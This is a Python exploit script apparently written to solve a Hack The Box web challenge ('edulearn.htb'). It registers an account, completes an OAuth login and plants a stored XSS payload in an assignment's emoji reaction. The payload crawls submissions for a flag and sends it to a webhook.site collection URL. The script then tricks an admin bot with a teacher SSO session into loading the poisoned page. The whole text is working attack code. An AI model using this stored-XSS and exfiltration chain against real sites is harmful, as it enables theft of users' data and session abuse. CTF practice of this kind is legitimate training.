#!/usr/bin/env python3
import re
import time
import urllib.parse

import requests

IP = "154.57.164.82"
PORT = 31059
BASE = f"http://{IP}:{PORT}"
APP = f"edulearn.htb:{PORT}"
SSO = f"sso.edulearn.htb:{PORT}"
CLIENT_ID = "1a2abb8b-9bb5-4463-8f74-d7b129bb7040"
HOOK = "https://webhook.site/2b639f7e-5069-44a3-9232-3b22ce2b30fe"

s = requests.Session()

def req(method, path, host, **kwargs):
    headers = {"Host": host}
    headers.update(kwargs.pop("headers", {}))
    return s.request(method, BASE + path, headers=headers, timeout=45, **kwargs)

email = f"final{int(time.time())}@x.htb"
password = "password123"
r = req("POST", "/api/register", SSO, json={"email": email, "password": password, "name": "Final User"})
print("register", r.status_code, flush=True)
r = req("POST", "/api/login", SSO, json={"email": email, "password": password})
print("login", r.status_code, flush=True)

# Configure Passport for this public port and complete a normal student login.
r = req("GET", "/auth", APP, allow_redirects=False)
auth_url = urllib.parse.urlsplit(r.headers["location"])
auth_path = auth_url.path + "?" + auth_url.query
r = req("GET", auth_path, SSO, allow_redirects=False)
if r.status_code == 200:
    q = urllib.parse.parse_qs(auth_url.query)
    r = req("POST", "/oauth/authorize", SSO, data={
        "client_id": CLIENT_ID,
        "scope": "email name",
        "redirect_uri": q["redirect_uri"][0],
        "state": q.get("state", [""])[0],
        "approved": "true",
    }, allow_redirects=False)
callback = urllib.parse.urlsplit(r.headers["location"])
r = req("GET", callback.path + "?" + callback.query, APP, allow_redirects=False)
print("student app callback", r.status_code, flush=True)

# Pick a public assignment and poison its reaction map. app.js writes emoji keys
# into innerHTML, so the event handler executes whenever the assignment is shown.
r = req("GET", "/", APP)
assignment_ids = list(dict.fromkeys(re.findall(r"/assignment/(\d+)", r.text)))
if not assignment_ids:
    raise RuntimeError("no public assignment found")
item_id = assignment_ids[0]

payload = (
    "<img src=x onerror=\"(async()=>{"
    "let h=await fetch('/').then(r=>r.text());"
    "let as=[...new Set([...h.matchAll(/\\/assignment\\/(\\d+)/g)].map(m=>m[1]))];"
    "for(let a of as){let p=await fetch('/assignment/'+a).then(r=>r.text());"
    "for(let m of p.matchAll(/\\/submission\\/(\\d+)/g)){"
    "let q=await fetch('/submission/'+m[1]).then(r=>r.text());"
    "let f=q.match(/HTB\\{[^}]+\\}/);"
    f"if(f){{new Image().src='{HOOK}/flag?d='+encodeURIComponent(f[0]);return}}"
    "}}})()\">"
)
r = req("POST", f"/api/reactions/{item_id}", APP, json={"emoji": payload})
print("reaction poison", r.status_code, "assignment", item_id, flush=True)

# The bot still owns a teacher SSO cookie. A normal authorize/callback cycle turns
# its EduLearn session back into teacher; callback redirects to /, which triggers
# the poisoned reaction immediately.
teacher_redirect = "http://edulearn.htb:1337/oauth/callback"
params = urllib.parse.urlencode({
    "response_type": "code",
    "client_id": CLIENT_ID,
    "scope": "email name",
    "redirect_uri": teacher_redirect,
})
teacher_url = "http://sso.edulearn.htb:1337/oauth/authorize?" + params
r = req("POST", "/submit-url", APP, data={"url": teacher_url}, allow_redirects=False)
print("teacher trigger", r.status_code, r.headers.get("location"), flush=True)
